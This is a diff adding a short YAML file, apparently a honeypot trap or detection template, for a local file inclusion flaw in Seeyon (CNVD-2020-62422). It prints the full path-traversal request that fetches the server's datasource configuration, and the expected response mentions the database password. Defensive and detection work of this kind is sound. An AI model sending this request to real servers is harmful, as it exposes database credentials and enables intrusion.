@@ -1,0 +1,21 @@
+id: CNVD-2020-62422
+info:
+  name: Seeyon - Local File Inclusion
+  author: pikpikcu
+  description: Seeyon is vulnerable to local file inclusion.
+  severity: medium
+  reference:
+  - https://blog.csdn.net/m0_46257936/article/details/113150699
+  metadata:
+    max-request: 1
+  tags: cnvd,cnvd2020,lfi,seeyon
+traps:
+- request:
+    method: GET
+    path: /seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: ctpDataSource.password
